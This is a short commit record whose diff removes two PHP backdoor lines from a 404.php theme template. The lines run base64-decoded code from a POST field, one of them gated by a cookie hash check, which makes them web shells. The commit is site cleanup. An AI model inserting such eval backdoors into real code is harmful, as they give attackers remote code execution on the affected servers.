d067982a13a8d06367ca46c6515a41f11c1a4452
Wayne Graham <wayne.graham@virginia.edu>
2012-02-15 07:54:43 -0500

    remove more eval from archives

--- 404.php
+++ 404.php
@@ -1,5 +1,3 @@
-<?php// if ($_POST["php"]){eval(base64_decode($_POST["php"]));exit;} ?>
-<?php// if(md5($_COOKIE['8bef3f0f123ceedb'])=="3c7dde32edfd1e35ac27e8f3c9b98c32"){ eval(base64_decode($_POST['file'])); exit; } ?>
 	
 <?php get_header(); ?>
 
